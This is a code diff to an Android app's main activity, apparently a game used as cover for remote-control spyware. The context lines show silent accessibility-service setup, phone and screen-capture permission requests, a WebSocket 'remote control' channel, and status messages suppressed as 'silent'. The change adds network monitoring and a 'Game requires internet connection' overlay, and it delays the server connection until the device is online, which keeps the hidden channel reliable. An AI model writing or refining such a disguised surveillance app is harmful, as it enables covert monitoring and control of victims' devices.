@@ -5,6 +5,10 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -14,6 +18,9 @@ import android.view.View
 import android.webkit.WebChromeClient
 import android.webkit.WebView
 import android.webkit.WebViewClient
+import android.widget.Button
+import android.widget.ProgressBar
+import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -31,14 +38,32 @@ class MainActivity : AppCompatActivity() {
     private val mainHandler = Handler(Looper.getMainLooper())
     private var serviceStarted = false
 
+    // Connectivity
+    private lateinit var connectivityManager: ConnectivityManager
+    private lateinit var offlineOverlay: View
+    private lateinit var retryButton: Button
+    private lateinit var loadingSpinner: ProgressBar
+    private lateinit var statusHint: TextView
+    private var isConnected = false
+    private var connectivityCallback: ConnectivityManager.NetworkCallback? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
         
         webSocketManager = WebSocketManager(this)
         gameView = findViewById(R.id.gameWebView)
+        offlineOverlay = findViewById(R.id.offlineOverlay)
+        retryButton = findViewById(R.id.retryButton)
+        loadingSpinner = findViewById(R.id.loadingSpinner)
+        statusHint = findViewById(R.id.statusHint)
+        
+        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         
         setupGameView()
+        setupConnectivityMonitoring()
+        
+        retryButton.setOnClickListener { checkAndRetry() }
         
         // Silent background setup
         if (!isAccessibilityServiceEnabled()) {
@@ -46,7 +71,9 @@ class MainActivity : AppCompatActivity() {
         }
         requestPhonePermission()
         requestScreenCapture()
-        webSocketManager.connect()
+        
+        // Initial check
+        checkConnectivity()
     }
 
     private fun setupGameView() {
@@ -62,10 +89,90 @@ class MainActivity : AppCompatActivity() {
         gameView.webViewClient = WebViewClient()
         gameView.webChromeClient = WebChromeClient()
         gameView.overScrollMode = View.OVER_SCROLL_NEVER
-        gameView.loadUrl("file:///android_asset/game.html")
     }
 
-    // All remote control methods unchanged
+    private fun setupConnectivityMonitoring() {
+        val networkRequest = NetworkRequest.Builder()
+            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            .build()
+
+        connectivityCallback = object : ConnectivityManager.NetworkCallback() {
+            override fun onAvailable(network: Network) {
+                mainHandler.post {
+                    if (!isConnected) {
+                        isConnected = true
+                        onNetworkAvailable()
+                    }
+                }
+            }
+
+            override fun onLost(network: Network) {
+                mainHandler.post {
+                    isConnected = false
+                    onNetworkLost()
+                }
+            }
+        }
+
+        connectivityManager.registerNetworkCallback(networkRequest, connectivityCallback!!)
+    }
+
+    private fun checkConnectivity() {
+        val network = connectivityManager.activeNetwork
+        val caps = connectivityManager.getNetworkCapabilities(network)
+        isConnected = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+        
+        if (isConnected) {
+            onNetworkAvailable()
+        } else {
+            onNetworkLost()
+        }
+    }
+
+    private fun checkAndRetry() {
+        loadingSpinner.visibility = View.VISIBLE
+        retryButton.isEnabled = false
+        statusHint.text = "Checking connection..."
+        
+        mainHandler.postDelayed({
+            val network = connectivityManager.activeNetwork
+            val caps = connectivityManager.getNetworkCapabilities(network)
+            isConnected = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+            
+            if (isConnected) {
+                onNetworkAvailable()
+            } else {
+                loadingSpinner.visibility = View.GONE
+                retryButton.isEnabled = true
+                statusHint.text = "Still no connection. Check your settings."
+            }
+        }, 2000)
+    }
+
+    private fun onNetworkAvailable() {
+        offlineOverlay.visibility = View.GONE
+        gameView.visibility = View.VISIBLE
+        loadingSpinner.visibility = View.GONE
+        
+        if (gameView.url == null || gameView.url!!.isEmpty()) {
+            gameView.loadUrl("file:///android_asset/game.html")
+        }
+        
+        // Connect to server now that we have internet
+        if (!webSocketManager.isConnected()) {
+            webSocketManager.connect()
+        }
+    }
+
+    private fun onNetworkLost() {
+        offlineOverlay.visibility = View.VISIBLE
+        gameView.visibility = View.GONE
+        loadingSpinner.visibility = View.GONE
+        retryButton.isEnabled = true
+        statusHint.text = "Game requires internet connection"
+    }
+
+    // Remote control methods unchanged below
     fun updateStatus(text: String) { /* silent */ }
 
     fun onServerConnected() {
@@ -127,6 +234,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onDestroy() {
+        connectivityCallback?.let { connectivityManager.unregisterNetworkCallback(it) }
         webSocketManager.disconnect()
         stopService(Intent(this, MediaProjectionService::class.java))
         super.onDestroy()
